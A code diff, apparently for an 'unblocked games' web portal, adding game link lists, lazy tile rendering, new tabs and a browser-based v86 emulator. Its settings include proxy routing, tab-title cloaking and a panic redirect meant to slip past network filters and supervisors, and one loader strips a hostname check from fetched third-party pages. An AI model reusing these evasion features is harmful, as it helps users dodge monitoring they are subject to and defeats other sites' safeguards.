-  {n:'Bullet Force',u:'https://www.crazygames.com/game/bullet-force-multiplayer'},{n:'Slope',u:'https://www.crazygames.com/game/slope'},
-  {n:'Run 3',u:'https://www.crazygames.com/game/run-3'},{n:'Temple Run 2',u:'https://www.crazygames.com/game/temple-run-2'},
-  {n:'Pacman',u:'https://www.crazygames.com/game/pacman'},{n:'Wordle',u:'https://www.crazygames.com/game/wordle'},
-];
-const EXTRA=[
-  {n:'Slice Master',u:'https://www.coolmathgames.com/0-slice-master'},{n:'2048',u:'https://play2048.co/'},
-  {n:'Slither.io',u:'https://slither.io'},{n:'Agar.io',u:'https://agar.io'},
-  {n:'Krunker.io',u:'https://krunker.io'},{n:'1v1.LOL',u:'https://1v1.lol'},
-  {n:'Shell Shockers',u:'https://shellshock.io'},{n:'Diep.io',u:'https://diep.io'},
-  {n:'Moomoo.io',u:'https://moomoo.io'},{n:'Zombs Royale',u:'https://zombsroyale.io'},
-  {n:'Skribbl.io',u:'https://skribbl.io'},{n:'Gartic Phone',u:'https://garticphone.com'},
-  {n:'GeoGuessr',u:'https://www.geoguessr.com'},{n:'WorldGuessr',u:'https://worldguessr.com'},
-  {n:'Globle',u:'https://globle-game.com'},{n:'Smash Karts',u:'https://smashkarts.io/'},
-  {n:'Colonist.io',u:'https://colonist.io/'},{n:'Codenames',u:'https://codenames.game/'},
-  {n:'Dino Game',u:'https://chromedino.com/'},{n:'Flappy Bird',u:'https://flappybird.io/'},
-  {n:'Slope',u:'https://slope-game.github.io/'},{n:'Minesweeper',u:'https://minesweeper.online/'},
-  {n:'Solitaire',u:'https://www.solitaire.org/'},{n:'Chess (Lichess)',u:'https://lichess.org/'},
-  {n:'MonkeyType',u:'https://monkeytype.com/'},{n:'Neal.fun',u:'https://neal.fun/'},
-  {n:'Infinite Craft',u:'https://neal.fun/infinite-craft/'},{n:'Password Game',u:'https://neal.fun/password-game/'},
-  {n:'Kahoot',u:'https://kahoot.it/'},{n:'Blooket',u:'https://dashboard.blooket.com/'},
-  {n:'Retro Bowl',u:'https://www.retrobowl.co.uk/'},{n:'Geometry Dash',u:'https://geometrydashgame.org/'},
-  {n:'Minecraft Classic',u:'https://classic.minecraft.net/'},{n:'Bonk.io',u:'https://bonk.io/'},
-  {n:'Ev.io',u:'https://ev.io/'},{n:'Scratch',u:'https://scratch.mit.edu/'},
-  {n:'Poki Games',u:'https://poki.com/'},{n:'Crazy Games',u:'https://www.crazygames.com/'},
-  {n:'itch.io free',u:'https://itch.io/games/free'},{n:'Newgrounds',u:'https://www.newgrounds.com'},
-  {n:'Armor Games',u:'https://armorgames.com'},{n:'Jackbox TV',u:'https://jackbox.tv'},
-  {n:'Super Smash Flash 2',u:'https://www.mcleodgaming.com/games/super-smash-flash-2'},
-  {n:'Strike Force Heroes',u:'https://strikeforceheroes.io/'},
-  {n:'Narrow One',u:'https://poki.com/en/g/narrow-one'},{n:'Rooftop Snipers',u:'https://poki.com/en/g/rooftop-snipers'},
-  {n:'Stickman Hook',u:'https://poki.com/en/g/stickman-hook'},{n:'Tiny Fishing',u:'https://poki.com/en/g/tiny-fishing'},
+const PUZZLE=[
+  {"n": "Portal Flash", "u": "https://www.numuki.com/game/portal-the-flash-version/"},
+  {"n": "Portal 2D", "u": "https://www.coolmathgames.com/0-portal-2d"},
+  {"n": "Portal Defenders", "u": "https://www.coolmathgames.com/0-portal-defenders"},
+  {"n": "Bloxorz", "u": "https://www.coolmathgames.com/0-bloxorz"},
+  {"n": "Bloxorz 2", "u": "https://www.coolmathgames.com/0-bloxorz-2"},
+  {"n": "Cut the Rope", "u": "https://www.coolmathgames.com/0-cut-the-rope"},
+  {"n": "Cut the Rope 2", "u": "https://www.coolmathgames.com/0-cut-the-rope-2"},
+  {"n": "Cut the Rope Time Travel", "u": "https://www.coolmathgames.com/0-cut-the-rope-time-travel"},
+  {"n": "Cut the Rope Experiments", "u": "https://www.coolmathgames.com/0-cut-the-rope-experiments"},
+  {"n": "Cut the Rope Magic", "u": "https://www.coolmathgames.com/0-cut-the-rope-magic"},
+  {"n": "Cut the Rope Holiday Gift", "u": "https://www.coolmathgames.com/0-cut-the-rope-holiday-gift"},
+  {"n": "Wheely", "u": "https://www.coolmathgames.com/0-wheely"},
+  {"n": "Wheely 2", "u": "https://www.coolmathgames.com/0-wheely-2"},
+  {"n": "Wheely 3", "u": "https://www.coolmathgames.com/0-wheely-3"},
+  {"n": "Wheely 4", "u": "https://www.coolmathgames.com/0-wheely-4"},
+  {"n": "Wheely 5", "u": "https://www.coolmathgames.com/0-wheely-5"},
+  {"n": "Wheely 6", "u": "https://www.coolmathgames.com/0-wheely-6"},
+  {"n": "Wheely 7", "u": "https://www.coolmathgames.com/0-wheely-7"},
+  {"n": "Wheely 8", "u": "https://www.coolmathgames.com/0-wheely-8"},
+  {"n": "IQ Ball", "u": "https://www.coolmathgames.com/0-iq-ball"},
+  {"n": "IQ Ball 2", "u": "https://www.coolmathgames.com/0-iq-ball-2"},
+  {"n": "Sugar Sugar", "u": "https://www.coolmathgames.com/0-sugar-sugar"},
+  {"n": "Sugar Sugar 2", "u": "https://www.coolmathgames.com/0-sugar-sugar-2"},
+  {"n": "Sugar Sugar 3", "u": "https://www.coolmathgames.com/0-sugar-sugar-3"},
+  {"n": "Snail Bob", "u": "https://www.coolmathgames.com/0-snail-bob"},
+  {"n": "Snail Bob 2", "u": "https://www.coolmathgames.com/0-snail-bob-2"},
+  {"n": "Snail Bob 3", "u": "https://www.coolmathgames.com/0-snail-bob-3"},
+  {"n": "Snail Bob 4", "u": "https://www.coolmathgames.com/0-snail-bob-4"},
+  {"n": "Snail Bob 5", "u": "https://www.coolmathgames.com/0-snail-bob-5"},
+  {"n": "Snail Bob 6", "u": "https://www.coolmathgames.com/0-snail-bob-6"},
+  {"n": "Snail Bob 7", "u": "https://www.coolmathgames.com/0-snail-bob-7"},
+  {"n": "Snail Bob 8", "u": "https://www.coolmathgames.com/0-snail-bob-8"},
+  {"n": "Factory Balls", "u": "https://www.coolmathgames.com/0-factory-balls"},
+  {"n": "Factory Balls 2", "u": "https://www.coolmathgames.com/0-factory-balls-2"},
+  {"n": "Factory Balls 3", "u": "https://www.coolmathgames.com/0-factory-balls-3"},
+  {"n": "Factory Balls 4", "u": "https://www.coolmathgames.com/0-factory-balls-4"},
+  {"n": "Factory Balls Forever", "u": "https://www.coolmathgames.com/0-factory-balls-forever"},
+  {"n": "Red Remover", "u": "https://www.coolmathgames.com/0-red-remover"},
+  {"n": "Red Remover 2", "u": "https://www.coolmathgames.com/0-red-remover-2"},
+  {"n": "Cover Orange", "u": "https://www.coolmathgames.com/0-cover-orange"},
+  {"n": "Cover Orange 2", "u": "https://www.coolmathgames.com/0-cover-orange-2"},
+  {"n": "Cover Orange Journey", "u": "https://www.coolmathgames.com/0-cover-orange-journey"},
+  {"n": "Cover Orange Players Pack", "u": "https://www.coolmathgames.com/0-cover-orange-players-pack"},
+  {"n": "Wake Up the Box", "u": "https://www.coolmathgames.com/0-wake-up-the-box"},
+  {"n": "Wake Up the Box 2", "u": "https://www.coolmathgames.com/0-wake-up-the-box-2"},
+  {"n": "Wake Up the Box 3", "u": "https://www.coolmathgames.com/0-wake-up-the-box-3"},
+  {"n": "Wake Up the Box 4", "u": "https://www.coolmathgames.com/0-wake-up-the-box-4"},
+  {"n": "Wake Up the Box 5", "u": "https://www.coolmathgames.com/0-wake-up-the-box-5"},
+  {"n": "Civiballs", "u": "https://www.coolmathgames.com/0-civiballs"},
+  {"n": "Civiballs 2", "u": "https://www.coolmathgames.com/0-civiballs-2"},
+  {"n": "Civiballs Xmas", "u": "https://www.coolmathgames.com/0-civiballs-xmas"},
+  {"n": "Civiballs Origins", "u": "https://www.coolmathgames.com/0-civiballs-origins"},
+  {"n": "Meeblings", "u": "https://www.coolmathgames.com/0-meeblings"},
+  {"n": "Meeblings 2", "u": "https://www.coolmathgames.com/0-meeblings-2"},
+  {"n": "Meeblings Player Pack", "u": "https://www.coolmathgames.com/0-meeblings-player-pack"},
+  {"n": "Grow Island", "u": "https://www.coolmathgames.com/0-grow-island"},
+  {"n": "Grow Cube", "u": "https://www.coolmathgames.com/0-grow-cube"},
+  {"n": "Grow RPG", "u": "https://www.coolmathgames.com/0-grow-rpg"},
+  {"n": "Grow Valley", "u": "https://www.coolmathgames.com/0-grow-valley"},
+  {"n": "Grow Tower", "u": "https://www.coolmathgames.com/0-grow-tower"},
+  {"n": "Grow Nano", "u": "https://www.coolmathgames.com/0-grow-nano"},
+  {"n": "Grow Park", "u": "https://www.coolmathgames.com/0-grow-park"},
+  {"n": "Grow Comeback", "u": "https://www.coolmathgames.com/0-grow-comeback"},
+  {"n": "The Impossible Quiz", "u": "https://www.coolmathgames.com/0-the-impossible-quiz"},
+  {"n": "The Impossible Quiz 2", "u": "https://www.coolmathgames.com/0-the-impossible-quiz-2"},
+  {"n": "The Impossible Quizmas", "u": "https://www.coolmathgames.com/0-the-impossible-quizmas"},
+  {"n": "The Idiot Test", "u": "https://www.coolmathgames.com/0-the-idiot-test"},
+  {"n": "World's Hardest Game", "u": "https://www.coolmathgames.com/0-world-s-hardest-game"},
+  {"n": "World's Hardest Game 2", "u": "https://www.coolmathgames.com/0-world-s-hardest-game-2"},
+  {"n": "World's Hardest Game 3", "u": "https://www.coolmathgames.com/0-world-s-hardest-game-3"},
+  {"n": "This Is the Only Level", "u": "https://www.coolmathgames.com/0-this-is-the-only-level"},
+  {"n": "This Is the Only Level 2", "u": "https://www.coolmathgames.com/0-this-is-the-only-level-2"},
+  {"n": "This Is the Only Level 3", "u": "https://www.coolmathgames.com/0-this-is-the-only-level-3"},
+  {"n": "There Is No Game", "u": "https://www.coolmathgames.com/0-there-is-no-game"},
+  {"n": "Achievement Unlocked", "u": "https://www.coolmathgames.com/0-achievement-unlocked"},
+  {"n": "Achievement Unlocked 2", "u": "https://www.coolmathgames.com/0-achievement-unlocked-2"},
+  {"n": "Achievement Unlocked 3", "u": "https://www.coolmathgames.com/0-achievement-unlocked-3"},
+  {"n": "2048", "u": "https://www.coolmathgames.com/0-2048"},
+  {"n": "4096", "u": "https://www.coolmathgames.com/0-4096"},
+  {"n": "8192", "u": "https://www.coolmathgames.com/0-8192"},
+  {"n": "16384", "u": "https://www.coolmathgames.com/0-16384"},
+  {"n": "Threes", "u": "https://www.coolmathgames.com/0-threes"},
+  {"n": "Hex FRVR", "u": "https://www.coolmathgames.com/0-hex-frvr"},
+  {"n": "10x10", "u": "https://www.coolmathgames.com/0-10x10"},
+  {"n": "1010 Deluxe", "u": "https://www.coolmathgames.com/0-1010-deluxe"},
+  {"n": "Tetris", "u": "https://www.coolmathgames.com/0-tetris"},
+  {"n": "Hextris", "u": "https://www.coolmathgames.com/0-hextris"},
+  {"n": "Blockudoku", "u": "https://www.coolmathgames.com/0-blockudoku"},
+  {"n": "Wood Block Puzzle", "u": "https://www.coolmathgames.com/0-wood-block-puzzle"},
+  {"n": "Minesweeper", "u": "https://www.coolmathgames.com/0-minesweeper"},
+  {"n": "Sudoku", "u": "https://www.coolmathgames.com/0-sudoku"},
+  {"n": "Nonogram", "u": "https://www.coolmathgames.com/0-nonogram"},
+  {"n": "Picross", "u": "https://www.coolmathgames.com/0-picross"},
+  {"n": "Mahjong", "u": "https://www.coolmathgames.com/0-mahjong"},
+  {"n": "Solitaire", "u": "https://www.coolmathgames.com/0-solitaire"},
+  {"n": "Chess", "u": "https://www.coolmathgames.com/0-chess"},
+  {"n": "Checkers", "u": "https://www.coolmathgames.com/0-checkers"},
+  {"n": "Connect 4", "u": "https://www.coolmathgames.com/0-connect-4"},
+  {"n": "Reversi", "u": "https://www.coolmathgames.com/0-reversi"},
+  {"n": "Battleship", "u": "https://www.coolmathgames.com/0-battleship"},
+  {"n": "Mastermind", "u": "https://www.coolmathgames.com/0-mastermind"},
+  {"n": "Wordle", "u": "https://www.coolmathgames.com/0-wordle"},
+  {"n": "Dordle", "u": "https://www.coolmathgames.com/0-dordle"},
+  {"n": "Quordle", "u": "https://www.coolmathgames.com/0-quordle"},
+  {"n": "Octordle", "u": "https://www.coolmathgames.com/0-octordle"},
+  {"n": "Waffle", "u": "https://www.coolmathgames.com/0-waffle"},
+  {"n": "Nerdle", "u": "https://www.coolmathgames.com/0-nerdle"},
+  {"n": "Globle", "u": "https://www.coolmathgames.com/0-globle"},
+  {"n": "Worldle", "u": "https://www.coolmathgames.com/0-worldle"},
+  {"n": "Word Search", "u": "https://www.coolmathgames.com/0-word-search"},
+  {"n": "Crossword", "u": "https://www.coolmathgames.com/0-crossword"},
+  {"n": "Hangman", "u": "https://www.coolmathgames.com/0-hangman"},
+  {"n": "Word City Crossed", "u": "https://www.coolmathgames.com/0-word-city-crossed"},
+  {"n": "Word Wipe", "u": "https://www.coolmathgames.com/0-word-wipe"},
+  {"n": "Word Cookies", "u": "https://www.coolmathgames.com/0-word-cookies"},
+  {"n": "Little Alchemy", "u": "https://www.coolmathgames.com/0-little-alchemy"},
+  {"n": "Little Alchemy 2", "u": "https://www.coolmathgames.com/0-little-alchemy-2"},
+  {"n": "Doodle God", "u": "https://www.coolmathgames.com/0-doodle-god"},
+  {"n": "Doodle Devil", "u": "https://www.coolmathgames.com/0-doodle-devil"},
+  {"n": "Doodle Farm", "u": "https://www.coolmathgames.com/0-doodle-farm"},
+  {"n": "Doodle Kingdom", "u": "https://www.coolmathgames.com/0-doodle-kingdom"},
+  {"n": "Doodle Creatures", "u": "https://www.coolmathgames.com/0-doodle-creatures"},
+  {"n": "Blue Box", "u": "https://www.coolmathgames.com/0-blue-box"},
+  {"n": "Clickplay", "u": "https://www.coolmathgames.com/0-clickplay"},
+  {"n": "Clickplay 2", "u": "https://www.coolmathgames.com/0-clickplay-2"},
+  {"n": "Clickplay 3", "u": "https://www.coolmathgames.com/0-clickplay-3"},
+  {"n": "Clickplay Rainbow", "u": "https://www.coolmathgames.com/0-clickplay-rainbow"},
+  {"n": "Full Moon", "u": "https://www.coolmathgames.com/0-full-moon"},
+  {"n": "Samorost", "u": "https://www.coolmathgames.com/0-samorost"},
+  {"n": "Samorost 2", "u": "https://www.coolmathgames.com/0-samorost-2"},
+  {"n": "Machinarium", "u": "https://www.coolmathgames.com/0-machinarium"},
+  {"n": "Factory Balls Christmas", "u": "https://www.coolmathgames.com/0-factory-balls-christmas"},
+  {"n": "Balloons", "u": "https://www.coolmathgames.com/0-balloons"},
+  {"n": "Balloons 2", "u": "https://www.coolmathgames.com/0-balloons-2"},
+  {"n": "Balloons 3", "u": "https://www.coolmathgames.com/0-balloons-3"},
+  {"n": "Balloons Player Pack", "u": "https://www.coolmathgames.com/0-balloons-player-pack"},
+  {"n": "Gluey", "u": "https://www.coolmathgames.com/0-gluey"},
+  {"n": "Gluey 2", "u": "https://www.coolmathgames.com/0-gluey-2"},
+  {"n": "Gluey 3", "u": "https://www.coolmathgames.com/0-gluey-3"},
+  {"n": "Isoball", "u": "https://www.coolmathgames.com/0-isoball"},
+  {"n": "Isoball 2", "u": "https://www.coolmathgames.com/0-isoball-2"},
+  {"n": "Isoball 3", "u": "https://www.coolmathgames.com/0-isoball-3"},
+  {"n": "Isoball X1", "u": "https://www.coolmathgames.com/0-isoball-x1"},
+  {"n": "Isoball X2", "u": "https://www.coolmathgames.com/0-isoball-x2"},
+  {"n": "Electric Box", "u": "https://www.coolmathgames.com/0-electric-box"},
+  {"n": "Electric Box 2", "u": "https://www.coolmathgames.com/0-electric-box-2"},
+  {"n": "Magic Pen", "u": "https://www.coolmathgames.com/0-magic-pen"},
+  {"n": "Magic Pen 2", "u": "https://www.coolmathgames.com/0-magic-pen-2"},
+  {"n": "Crayon Physics", "u": "https://www.coolmathgames.com/0-crayon-physics"},
+  {"n": "Fantastic Contraption", "u": "https://www.coolmathgames.com/0-fantastic-contraption"},
 ];
 const SITES=[
   {sec:'🔍 Search',sites:[{n:'Google',u:'https://google.com',d:'Search engine'},{n:'DuckDuckGo',u:'https://duckduckgo.com',d:'Private search'},{n:'Wikipedia',u:'https://en.wikipedia.org',d:'Free encyclopedia'},{n:'Wolfram Alpha',u:'https://www.wolframalpha.com',d:'Computational answers'},{n:'Archive.org',u:'https://archive.org',d:'Wayback Machine'},{n:'Reddit',u:'https://reddit.com',d:'Social forum'},]},
@@ -951,19 +2254,58 @@ const SITES=[
 ];
 
 // ══ RENDER TILES ══
-function buildTiles(arr,containerId){const el=document.getElementById(containerId);if(!el)return;el.innerHTML='';arr.forEach(g=>{const b=document.createElement('button');b.className='gtile';b.textContent=g.n||g.name;b.onclick=()=>launchGame(g.n||g.name,g.u||g.url);el.appendChild(b);});}
-function filterG(arr,containerId,q){buildTiles(q?arr.filter(g=>(g.n||g.name).toLowerCase().includes(q.toLowerCase())):arr,containerId);}
+const ric=window.requestIdleCallback||function(cb){return setTimeout(()=>cb({timeRemaining:()=>0,didTimeout:true}),1);};
+let tileObserver=null;
+function getTileObserver(){
+  if(tileObserver||!('IntersectionObserver' in window))return tileObserver;
+  tileObserver=new IntersectionObserver(entries=>{
+    entries.forEach(entry=>{
+      if(!entry.isIntersecting)return;
+      const b=entry.target;
+      if(!b.dataset.bound){
+        b.dataset.bound='1';
+        b.addEventListener('click',()=>launchGame(b.dataset.gameName,b.dataset.gameUrl),{once:false});
+      }
+      tileObserver.unobserve(b);
+    });
+  },{root:null,rootMargin:'250px 0px',threshold:0.01});
+  return tileObserver;
+}
+function bindTileWhenVisible(b){
+  const obs=getTileObserver();
+  if(obs){obs.observe(b);}else{b.addEventListener('click',()=>launchGame(b.dataset.gameName,b.dataset.gameUrl));}
+}
+function showTileSkeleton(el,count=24){el.innerHTML='<div class="ugs-skeleton-wrap">'+Array.from({length:Math.min(count,36)},()=>'<div class="ugs-skel-tile"></div>').join('')+'</div>';}
+function buildTiles(arr,containerId){
+  const el=document.getElementById(containerId);if(!el)return;
+  showTileSkeleton(el,arr.length);
+  ric(()=>{
+    const frag=document.createDocumentFragment();
+    arr.forEach(g=>{
+      const name=g.n||g.name, url=g.u||g.url;
+      const b=document.createElement('button');
+      b.className='gtile';b.textContent=name;b.dataset.gameName=name;b.dataset.gameUrl=url;
+      bindTileWhenVisible(b);frag.appendChild(b);
+    });
+    el.innerHTML='';el.appendChild(frag);
+    try{applyExtraSettings();}catch(e){}
+  },{timeout:1200});
+}
+function filterG(arr,containerId,q){
+  const term=(q||'').toLowerCase();
+  buildTiles(term?arr.filter(g=>(g.n||g.name).toLowerCase().includes(term)):arr,containerId);
+}
 function buildSites(){const el=document.getElementById('sites-container');if(!el||el.children.length)return;SITES.forEach(sec=>{const w=document.createElement('div');w.style.cssText='max-width:980px;margin:0 auto 16px;';const div=document.createElement('div');div.className='divider';div.innerHTML=`<span>${sec.sec}</span>`;w.appendChild(div);const grid=document.createElement('div');grid.className='site-grid';sec.sites.forEach(s=>{const c=document.createElement('div');c.className='site-card';c.innerHTML=`<div class="sc-name">${s.n}</div><div class="sc-desc">${s.d}</div>`;c.onclick=()=>launchGame(s.n,s.u);grid.appendChild(c);});w.appendChild(grid);el.appendChild(w);});}
 
 // ══ GLOBAL SEARCH ══
-const ALL_GAMES_COMBINED=[...PIZZA,...PZRD,...COOL,...POKI,...EXTRA].filter((g,i,a)=>a.findIndex(x=>(x.n||x.name)===(g.n||g.name))===i);
+const ALL_GAMES_COMBINED=[...PIZZA,...PZRD,...COOL,...POKI,...EXTRA,...FIGHTING,...RACING,...PUZZLE].filter((g,i,a)=>a.findIndex(x=>(x.n||x.name)===(g.n||g.name))===i);
 function doSearch(){
   const q=document.getElementById('global-search-input').value.trim();
   const scope=document.getElementById('search-scope').value;
   const panel=document.getElementById('search-results-panel');
   const grid=document.getElementById('search-results-grid');
   if(!q){panel.style.display='none';document.getElementById('search-count').textContent='';return;}
-  let pool=scope==='all'?ALL_GAMES_COMBINED:scope==='pizza'?PIZZA:scope==='pzrd'?PZRD:scope==='cool'?COOL:scope==='poki'?POKI:scope==='extra'?EXTRA:scope==='dos'?DOS_GAMES.map(g=>({n:g.n,u:'#dos:'+g.id})):scope==='sites'?SITES.flatMap(s=>s.sites.map(x=>({n:x.n,u:x.u}))):ALL_GAMES_COMBINED;
+  let pool=scope==='all'?ALL_GAMES_COMBINED:scope==='pizza'?PIZZA:scope==='pzrd'?PZRD:scope==='cool'?COOL:scope==='poki'?POKI:scope==='extra'?EXTRA:scope==='fighting'?FIGHTING:scope==='racing'?RACING:scope==='puzzle'?PUZZLE:scope==='dos'?DOS_GAMES.map(g=>({n:g.n,u:'#dos:'+g.id})):scope==='sites'?SITES.flatMap(s=>s.sites.map(x=>({n:x.n,u:x.u}))):ALL_GAMES_COMBINED;
   const filtered=pool.filter(g=>(g.n||g.name).toLowerCase().includes(q.toLowerCase()));
   document.getElementById('search-count').textContent=filtered.length+' found';
   grid.innerHTML='';
@@ -972,6 +2314,98 @@ function doSearch(){
 }
 function doSearchEnter(){const q=document.getElementById('global-search-input').value.trim();if(!q)return;ST('browser');browserQuick('https://www.google.com/search?q='+encodeURIComponent(q));clearSearch();}
 function clearSearch(){document.getElementById('global-search-input').value='';document.getElementById('search-results-panel').style.display='none';document.getElementById('search-count').textContent='';}
+
+
+// ══ WINDOS / V86 EMULATOR ══
+let windosLibLoading=null, windosLoaded=false, windosEmulator=null;
+const WINDOS_PRESETS={
+  freedos:{
+    label:'FreeDOS',
+    config:{ fda:{ url:'https://copy.sh/v86/images/freedos722.img', async:true } }
+  },
+  win95:{
+    label:'Windows 95',
+    config:{ hda:{ url:'https://copy.sh/v86/images/windows95.img', async:true }, memory_size:32*1024*1024, vga_memory_size:2*1024*1024 }
+  },
+  kolibri:{
+    label:'Linux (Kolibri)',
+    config:{ cdrom:{ url:'https://copy.sh/v86/images/kolibrios.iso', async:true } }
+  }
+};
+function setWinDOSStatus(msg,isError){
+  const st=document.getElementById('windos-status');
+  const er=document.getElementById('windos-error');
+  if(st){st.textContent=msg;st.style.color=isError?'var(--red)':(msg==='Running'?'var(--green)':'var(--muted)');}
+  if(er){er.style.display=isError?'block':'none';er.textContent=isError?msg:'';}
+}
+function loadWinDOSLib(){
+  if(window.V86||window.V86Starter)return Promise.resolve();
+  if(windosLibLoading)return windosLibLoading;
+  setWinDOSStatus('Loading...',false);
+  windosLibLoading=new Promise((resolve,reject)=>{
+    try{
+      const sc=document.createElement('script');
+      sc.src='https://copy.sh/v86/libv86.js';
+      sc.onload=()=>resolve();
+      sc.onerror=()=>reject(new Error('Could not load libv86.js. Check your connection or try again.'));
+      document.head.appendChild(sc);
+    }catch(e){reject(e);}
+  });
+  return windosLibLoading;
+}
+function initWinDOS(){
+  if(windosLoaded)return;
+  windosLoaded=true;
+  loadWinDOSLib().then(()=>setWinDOSStatus('Ready',false)).catch(e=>setWinDOSStatus('WinDOS failed to load: '+e.message,true));
+}
+function destroyWinDOS(){
+  try{if(windosEmulator&&typeof windosEmulator.destroy==='function')windosEmulator.destroy();}
+  catch(e){console.warn('v86 destroy failed:',e);}
+  windosEmulator=null;
+  const old=document.getElementById('v86-screen');
+  if(old){const c=old.cloneNode(false);old.parentNode.replaceChild(c,old);}
+}
+async function launchWinDOS(key){
+  const preset=WINDOS_PRESETS[key];
+  if(!preset)return;
+  try{
+    setWinDOSStatus('Loading...',false);
+    await loadWinDOSLib();
+    destroyWinDOS();
+    const canvas=document.getElementById('v86-screen');
+    const holder=document.getElementById('v86-holder');
+    if(!canvas)throw new Error('Missing v86-screen canvas.');
+    const baseConfig=Object.assign({
+      wasm_path:'https://copy.sh/v86/build/v86.wasm',
+      bios:{url:'https://copy.sh/v86/bios/seabios.bin'},
+      vga_bios:{url:'https://copy.sh/v86/bios/vgabios.bin'},
+      canvas:canvas,
+      screen_container:holder,
+      autostart:true
+    },preset.config);
+    const Ctor=window.V86||window.V86Starter;
+    if(!Ctor)throw new Error('v86 did not expose V86 or V86Starter.');
+    windosEmulator=new Ctor(baseConfig);
+    if(windosEmulator&&typeof windosEmulator.add_listener==='function'){
+      windosEmulator.add_listener('emulator-ready',()=>setWinDOSStatus('Running',false));
+      windosEmulator.add_listener('download-error',()=>setWinDOSStatus('Could not load '+preset.label+' image. Try again or check if the image URL is blocked.',true));
+    }
+    setTimeout(()=>{if(windosEmulator&&document.getElementById('windos-status').textContent==='Loading...')setWinDOSStatus('Running',false);},5000);
+  }catch(e){
+    setWinDOSStatus('Could not start '+preset.label+': '+(e&&e.message?e.message:e),true);
+  }
+}
+function windosFullscreen(){try{if(windosEmulator&&typeof windosEmulator.screen_make_fullscreen==='function')windosEmulator.screen_make_fullscreen();else fullscreenEl('v86-holder');}catch(e){setWinDOSStatus('Fullscreen failed: '+e.message,true);}}
+function windosReset(){try{if(windosEmulator&&typeof windosEmulator.restart==='function'){setWinDOSStatus('Loading...',false);windosEmulator.restart();setTimeout(()=>setWinDOSStatus('Running',false),1200);}else setWinDOSStatus('Start an OS first, then reset.',true);}catch(e){setWinDOSStatus('Reset failed: '+e.message,true);}}
+
+
+function toggleSidebar(){
+  try{
+    document.body.classList.toggle('sidebar-expanded');
+    localStorage.setItem('ugs_sidebar_expanded',document.body.classList.contains('sidebar-expanded')?'1':'0');
+  }catch(e){}
+}
+try{if(localStorage.getItem('ugs_sidebar_expanded')==='1')document.body.classList.add('sidebar-expanded');}catch(e){}
 
 // ══ TAB SWITCHING ══
 let gnmathLoaded=false;
@@ -983,19 +2417,30 @@ function initGnMath(){
   function loadGnMath(url){fetch(url+'?t='+Date.now()).then(r=>{if(!r.ok)throw new Error('HTTP '+r.status);return r.text();}).then(html=>{html=html.replace('new URL(url, location.origin).hostname','""');frame.srcdoc=html;}).catch(err=>{if(url===PRIMARY){loadGnMath(BACKUP);}else{frame.srcdoc='<body style="background:#0d0f1a;color:white;font-family:monospace;padding:30px;"><h2>GN Math failed to load</h2><p>'+err.message+'</p></body>';}});}
   loadGnMath(PRIMARY);
 }
-function ST(name){
+function applyTabSwitch(name){
   document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
   document.querySelectorAll('.sb-btn').forEach(b=>b.classList.remove('active'));
   const panel=document.getElementById('tab-'+name);if(panel)panel.classList.add('active');
   const btn=document.getElementById('t-'+name);if(btn)btn.classList.add('active');
+}
+function afterTabSwitch(name){
   if(name==='pizza'&&!document.getElementById('pizza-list').children.length)buildTiles(PIZZA,'pizza-list');
   if(name==='pzrd'&&!document.getElementById('pzrd-list').children.length)buildTiles(PZRD,'pzrd-list');
-  if(name==='cool'&&!document.getElementById('cool-list').children.length)buildTiles(COOL,'cool-list');
+  if(name==='cool'){const cf=document.getElementById('coolmath-direct-frame');if(cf&&cf.dataset.src&&cf.src==='about:blank')cf.src=cf.dataset.src;if(!document.getElementById('cool-list').children.length)buildTiles(COOL,'cool-list');}
   if(name==='poki'&&!document.getElementById('poki-list').children.length)buildTiles(POKI,'poki-list');
   if(name==='extra'&&!document.getElementById('extra-list').children.length)buildTiles(EXTRA,'extra-list');
-  if(name==='dos')initDos();if(name==='gnmath')initGnMath();if(name==='sites')buildSites();
+  if(name==='fighting'&&!document.getElementById('fighting-list').children.length)buildTiles(FIGHTING,'fighting-list');
+  if(name==='racing'&&!document.getElementById('racing-list').children.length)buildTiles(RACING,'racing-list');
+  if(name==='puzzle'&&!document.getElementById('puzzle-list').children.length)buildTiles(PUZZLE,'puzzle-list');
+  if(name==='dos')initDos();if(name==='windos')initWinDOS();if(name==='gnmath')initGnMath();if(name==='sites')buildSites();
   if(name==='browser')setBrowserMode('both');
   try{if(window.S&&S.rememberTab){S.lastTab=name;saveS();}}catch(e){}
+}
+function ST(name){
+  const run=()=>{applyTabSwitch(name);afterTabSwitch(name);};
+  try{
+    if(document.startViewTransition){document.startViewTransition(run);}else{run();}
+  }catch(e){run();}
 }
 
 // ══ PANIC ══
@@ -1003,15 +2448,15 @@ function doPanic(){const url=(S&&S.panicUrl)||'https://google.com';const mode=(S
 
 // ══ SETTINGS ENGINE ══
 const SK='ugs_v5';
-const DS={autoProxy:true,proxyMode:'both',primaryProxy:'corslol',customProxy:'',cloakEnabled:false,cloakTitle:'',cloakIcon:'',autoCloak:false,panicUrl:'https://google.com',panicKey:'',panicMode:'redirect',showPanic:true,theme:'default',accent:'#5c7cfa',bgCol:'#0d0f1a',fontSize:'14',sidebarPos:'left',hideTitle:false,compactSb:false,denseUi:false,roundness:'soft',glassPanels:false,showGrain:true,reduceMotion:false,highContrast:false,newTab:false,defaultTab:'games',rememberTab:false,lastTab:'games',showSearchbar:true,showDoclink:true,showClock:false,centerPanels:true,bigButtons:false,monoUi:false};
+const DS={autoProxy:true,proxyMode:'both',primaryProxy:'corslol',customProxy:'',cloakEnabled:false,cloakTitle:'',cloakIcon:'',autoCloak:false,panicUrl:'https://google.com',panicKey:'',panicMode:'redirect',showPanic:true,theme:'default',accent:'#5c7cfa',bgCol:'#0d0f1a',fontSize:'14',sidebarPos:'left',hideTitle:false,compactSb:false,denseUi:false,roundness:'soft',glassPanels:false,showGrain:true,reduceMotion:false,highContrast:false,newTab:false,defaultTab:'games',rememberTab:false,lastTab:'games',showSearchbar:true,showDoclink:true,showClock:false,centerPanels:true,bigButtons:false,monoUi:false,lazyIframes:true,preloadImages:false,cacheGames:true,sidebarIconSize:'medium',gameTileSize:'normal',gameView:'grid',animatedBg:false,bgImage:'',bgBlur:0,bgDim:35,particles:false,keybinds:{games:'g',pizza:'p',pzrd:'z',cool:'c',poki:'o',extra:'m',fighting:'f',racing:'r',puzzle:'q',browser:'b',dos:'d',windos:'w',gnmath:'n',tools:'t',settings:'s'}};
 let S=Object.assign({},DS);
 const realTitle=document.title;
 function loadS(){try{const d=JSON.parse(localStorage.getItem(SK));if(d)S=Object.assign({},DS,d);}catch(e){}syncS();applyS();}
